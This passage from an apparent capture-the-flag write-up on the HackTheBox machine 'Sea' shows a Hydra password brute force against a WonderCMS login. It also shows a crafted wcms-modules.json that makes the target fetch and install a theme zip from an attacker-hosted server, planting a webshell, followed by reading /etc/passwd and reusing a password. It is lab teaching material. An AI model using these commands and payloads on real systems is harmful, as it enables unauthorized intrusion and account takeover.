- `'/loginURL:password=^PASS^:Wrong'` - The string of arguments for the module, split on `:`:
  - `/loginURL` - The relative path to send the POST request to.
  - `password=^PASS^` - The POST body, with `^PASS^` being where each password is substituted. I can also provide `^USER^` for the user value.
  - `Wrong` - The text that indicates failure.

Running this takes about eight minutes to find the right password in `rockyou.txt`, at which point I’ll hit Ctrl-c to end the brute force:

```

oxdf@hacky$ hydra -l '' -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt sea.htb http-post-form "/loginURL:password=^PASS^:Wrong" -I
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-12 15:00:17
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://sea.htb:80/loginURL:password=^PASS^:Wrong
[STATUS] 422.00 tries/min, 422 tries in 00:01h, 14343976 to do in 566:31h, 16 active
[STATUS] 421.00 tries/min, 1263 tries in 00:03h, 14343135 to do in 567:50h, 16 active
[STATUS] 417.29 tries/min, 2921 tries in 00:07h, 14341477 to do in 572:49h, 16 active
[80][http-post-form] host: sea.htb   password: mychemicalromance
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.

```

### Upload Theme

#### Admin Panel Enumeration

It is technically possible to SSH now with this password, but I don’t have the username to log in with, so I’ll explore the admin panel. On entering the password, the main page is loaded, but with a bunch of extra buttons / notifications:

![image-20240812152538171](/img/image-20240812152538171.png)

Clicking “Settiongs” loads a form:

![image-20240812152610597](/img/image-20240812152610597.png)

I can edit content and create pages. HTML injection and XSS is very do-able via this function, but that doesn’t buy me much at this point.

The “Files” menu has an upload option:

![image-20240812152917440](/img/image-20240812152917440.png)

If I try an PHP webshell, it fails:

![image-20240812152909491](/img/image-20240812152909491.png)

The “Themes” page has a bunch of themes that can be installed, including the existing one:

![image-20240812153022347](/img/image-20240812153022347.png)

At the bottom there’s a form to add a custom module:

![image-20240812153038398](/img/image-20240812153038398.png)

The “Plugins” page is similar, with the same form at the bottom. The “Security” page offers a configuration to change the login URL, the password, and a few other configurations.

#### Malicious Theme

The exploit used [above](#malicious-theme) had the admin submit a malicious theme providing the URL of the zip archive. Without knowing how that works, I’ll try to use the GUI admin panel here. The “Custom Module” form at the bottom of the “Themes” page says it takes the URL to a `wcms-modules.json` file. Giving it the URL to where I’m hosting the zip doesn’t work.

[This page](https://github.com/WonderCMS/wondercms/wiki/Custom-modules#custom-theme-module-requirements) shows how to create a `wcms-modules.json` file. I’ll create one from that template:

```

{
    "version": 1,
    "themes": {
        "theme-name": {
            "name": "Theme-0xdf",
            "repo": "http://10.10.14.6/repo",
            "zip": "http://10.10.14.6/theme223.zip",
            "summary": "Malicious Theme",
            "version": "1.0.0",
            "image": "http://10.10.14.6/image.jpg"
        }
    }
}

```

Hosting that and the same `theme223.zip` file from [above](#malicious-theme) on my Python webserver, I’ll submit the URL to the admin panel. There’s a popup warning that this is dangerous:

![image-20240812153608020](/img/image-20240812153608020.png)

There are three requests at my server:

```
10.10.11.28 - - [12/Aug/2024 15:36:13] "GET /wcms-modules.json HTTP/1.1" 200 -
10.10.11.28 - - [12/Aug/2024 15:36:13] "GET /wcms-modules.json HTTP/1.1" 200 -
10.10.14.6 - - [12/Aug/2024 15:36:14] code 404, message File not found
10.10.14.6 - - [12/Aug/2024 15:36:14] "GET /image.jpg HTTP/1.1" 404 -

```

It’s interesting that the first two are from Sea, and then the next GET for the image is from my browser. That suggests to me that the module was processed, and then displayed back as part of the page. The page I see is the main page with a popup:

![image-20240812153831570](/img/image-20240812153831570.png)

Back on the Themes page my theme is at the bottom with no image:

![image-20240812153858955](/img/image-20240812153858955.png)

There hasn’t been a request for the zip archive yet, but there’s an “Install” button. When I click it, two more requests:

```
10.10.11.28 - - [12/Aug/2024 15:39:33] "GET /theme223.zip HTTP/1.1" 200 -
10.10.14.6 - - [12/Aug/2024 15:39:34] code 404, message File not found
10.10.14.6 - - [12/Aug/2024 15:39:34] "GET /image.jpg HTTP/1.1" 404 -

```

The page shows it installed:

![image-20240812154007679](/img/image-20240812154007679.png)

And the webshell is there:

![image-20240812154030698](/img/image-20240812154030698.png)

From here, I can get a shell, or just find the names of the users from `/etc/passwd` or `/home` and find that the admin password works for amay.